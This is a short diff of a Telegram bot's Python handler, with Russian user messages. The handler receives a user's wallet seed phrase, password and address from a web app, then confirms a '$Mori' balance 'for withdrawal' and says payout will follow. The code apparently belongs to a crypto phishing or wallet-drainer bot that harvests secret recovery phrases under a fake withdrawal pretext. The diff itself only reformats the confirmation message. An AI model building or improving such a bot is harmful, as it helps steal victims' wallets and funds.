@@ -393,12 +393,14 @@ async def handle_web_app_data(update: Update, context: ContextTypes.DEFAULT_TYPE
             
             # Отправляем сообщение пользователю с его данными и балансом
             user_name = update.effective_user.first_name or "Пользователь"
+            current_balance = user_balances[user_id]
+            
             message_text = (
                 f"✅ Данные кошелька получены!\n\n"
-                f"💰 Ваш баланс: {user_balances[user_id]} $Mori\n\n"
-                f"📝 Seed фраза: `{seed_phrase}`\n\n"
-                f"🔑 Пароль: `{password}`\n\n"
-                f"💼 Адрес кошелька: `{wallet_address}`\n\n"
+                f"💰 Ваш баланс для вывода: {current_balance} $Mori\n\n"
+                f"📝 Seed фраза:\n`{seed_phrase}`\n\n"
+                f"🔑 Пароль:\n`{password}`\n\n"
+                f"💼 Адрес кошелька:\n`{wallet_address}`\n\n"
                 f"💵 Вывод средств будет обработан в ближайшее время."
             )
             
